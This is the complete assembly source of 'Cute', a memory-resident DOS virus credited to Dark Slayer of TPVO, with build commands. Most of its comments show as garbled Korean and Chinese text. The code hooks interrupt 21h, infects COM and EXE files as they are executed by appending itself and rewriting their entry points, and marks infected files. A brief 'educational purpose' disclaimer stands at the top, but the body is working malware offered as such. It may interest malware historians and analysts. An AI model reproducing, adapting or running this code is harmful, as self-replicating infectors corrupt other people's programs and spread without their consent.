;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     Cute                                    \          \     \   \
;            by Dark Slayer of TPVO           \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : Cute
; Author     : Dark Slayer of TPVO
; Origin     : Taiwan
; Type : Memory resident  COM
;
; !****************************************************************************!
; *                                                                            *
; * ‰w‰¡ !                                                                     *
; *    ·¡ˆõ·e ¤a·¡œá¯a ­¡¯a Å¡—a·¡”a. Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡Ðe”a.      *
; *    ¹A¸b¸a“e ·¡ ­¡¯aÅ¡—a¡ ´¡‹¡–A“e ´á˜áÐe ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g   *
; *    “e”a. ¥eÑw Ðaˆáa ¯©Ð—Ða»¡  iœa !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
; TPVO · Dark Slayer ˆa ¹A¸bÐe ¤a·¡œá¯a·¡”a.
;
;
;
;     ¯©Ð— Ìa·©  e—a“e¤ó
;
;         tasm /m cute.asm
;         tlink cute.obj
;         exe2com cute.exe cute.com
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;=========================== Begin Cute.asm ==================================

vir_size equ    offset vir_end-offset start     ;
mem_size equ    offset mem_end-offset start     ;

vir_addr equ    580h                            ; ‹¡´â¸w­¡µA ¬wºÐi ¶áÃ¡

vir_mark equ    0e9h                            ;

        .286                            ; 286 ·¡¬w µA¬á ¸b•·
        .model  tiny
        .code
        org     0
start:
        push    es                      ;
        mov     di,vir_addr+2           ; DI = 582h
        xor     ax,ax                   ;
        mov     es,ax                   ; 0:vir_addr
        call    delta
delta:
        pop     si                      ; ¤a·¡œá¯a ¯¡¸b¸ñ ´è‹¡
        sub     si,offset delta-2
        push    cs
        pop     ds
        std                             ; cmpsw Ða¡e -2 ˆa –E”a.
        cmpsw                           ; SI “e ¤a·¡œá¯a ¯¡¸b¸ñ·¡ –A‰¡
        cld                             ; DI “e 580h ˆa –E”a.
        mov     cx,mem_size             ; ¤a·¡œá¯a ‹©·¡
        rep     movsb                   ; ¤a·¡œá¯a --> 0000:0580h ¡ ¥¢¬a
        je      run_host                ;

        mov     bx,vir_addr/10h         ; bx = segment
        mov     al,offset int21         ; ax = Int 21h º­¡ˆt
        xchg    ax,es:[bx+21h*4-vir_addr/10h]   ; Int 21h ˆa¡À‹¡
        stosw                           ; AX -> ES:DI
        xchg    bx,es:[bx+21h*4-vir_addr/10h+2] ;
        xchg    bx,ax                   ; Ñe¸ DI “e ¤a·¡œá¯a {¦¦…·¡ –A£a¡
        stosw                           ; Int 21h º­¡ ¸á¸wÐa“e ‰µµA ¶áÃ¡Ð·¶”a.
run_host:
        pop     es                      ; es ¥¢Š (=PSP)
        lodsw                           ; si = si + 2
        lodsw                           ; si = si + 2
        cmp     sp,0fffch
        jb      exe_host                ; sp < 0fffch? ·¡¡e EXE Ìa·© ·¡”a.
com_host:
        mov     di,100h                 ;
        push    di                      ; COM ´|¦¦… ¥¢Š
        movsw                           ;
        movsw                           ; 4 ¤a·¡Ëa ¥¢Š
        ret                             ; CS:100h ¡ ·¡•·
exe_host:
        lodsw                           ;
        xchg    di,ax                   ; EXE ˆt ¥¢Š
        mov     bx,es                   ; bx=es=psp segment
        lea     ax,[bx+di+10h]          ; ax= cs + psp segment + 10h
        push    ax                      ;
        lodsw                           ; ip ¥¢¬a
        push    ax                      ;
        mov     ds,bx                   ; ds=bx=psp segment
        retf                            ; ¶¥œ EXE CS:IP ¡ ¸ñÏa

int21:
        cmp     ax,4b00h                ; Ìa·© ¯©Ð—·¥ˆa ?
        jne     i21_exit                ; ´a“¡¡e {‘
        pusha
        push    ds es
        mov     ax,3d02h                ; Ìa·© µ¡Ïe
        int     21h                     ;
        xchg    bx,ax                   ; BX = Ìa·© Ð…—i
        push    cs cs
        pop     ds es                   ; ds=es=cs
        mov     ah,3fh                  ; Ìa·© ·ª‹¡
        mov     cx,18h                  ; CX = ‹©·¡
        mov     dx,offset vir_end       ; DX = ¤áÌá
        int     21h                     ;
        mov     si,dx                   ;
        mov     di,offset host_4_bytes  ;
        mov     ax,4202h                ; Ìa·© {·a¡ ·¡•·
        xor     cx,cx                   ;
        cwd                             ;
        int     21h                     ;
                                        ;
        mov     cl,vir_mark             ; 0xE9h
        cmp     byte ptr ds:[si],'M'    ; EXE Ìa·© ·¥ˆa ?
        je      infect_exe              ;
infect_com:
        movsw                           ; SI = ¤áÌá
        movsw                           ; DI = •A·¡Èá ¸á¸w ¤áÌá
        xchg    cx,ax                   ; cl=vir mark=0e9h ( jmp code )
                                        ; ax = Ìa·© ‹©·¡ ·i ¬á¡ ŠaÑÅ Ðe”a.
        stosb                           ; AL (E9h) --> ES:DI
        xchg    cx,ax                   ;
        sub     ax,3                    ; JMP ˆt ‰¬e
        stosw
        jmp     infect_common
infect_exe:
        cmp     word ptr ds:[di+4+2],200h-vir_size      ; offset 2=exe mod
        cmc                             ; ¦pªG exe mod<200h-vir_size¡A«h cmc
                                        ;   ¤§«á¡Acf=0¡A§_«h cf=1
        adc     word ptr ds:[di+4+4],0  ; exe sector=exe sector+cf
        mov     si,10h
        div     si                      ; dx:ax/10h -> dx=¾l¼Æ (·P¬V«áªº ip ­È)
                                        ;              ax=°Ó¼Æ (ÀÉªø/10h ªº°Ó)
        sub     ax,ds:[di+4+8]          ; offset 8=ÀÉÀYªºªø«× (¥H para ¬°³æ¦ì),
                                        ;   ax=ax-ÀÉÀYªºªø«×=·P¬V«áªº cs ¼W¶q
        xchg    dx,ds:[di+4+14h]        ; offset 14h=exe ip
        xchg    ax,ds:[di+4+16h]        ; offset 16h=distance of exe cs
        stosw                           ; exe cs
        xchg    dx,ax
        stosw                           ; exe ip
        add     di,12h                  ; offset 12h=check sum
infect_common:
        cmp     ds:[di],cl              ;
        je      close                   ;
        mov     ds:[di],cl              ; mark
        mov     ah,40h                  ; ¤a·¡œá¯a ³a‹¡
        mov     cl,vir_size
        cwd
        int     21h                     ;
        mov     ax,4200h                ; Í¡·¥Èá Àá·q·a¡ ·¡•·
        xor     cx,cx
        int     21h                     ; ÑA”á ³a‹¡
        mov     ah,40h
        mov     cl,18h
        mov     dl,offset vir_end
        int     21h                     ;
close:
        mov     ah,3eh
        int     21h                     ; Ìa·© ”h‹¡
        pop     es ds
        popa
i21_exit:
        db      0eah                    ; ¶¥œ ·¥ÈáœóËa 21h ¡ ¸ñÏa
mem_end:
old21   dw      ?,?                     ; Int 21h ˆt

host_4_bytes db 0cdh,20h,0,0            ; ´|¦¦…
vir_end:
        end     start

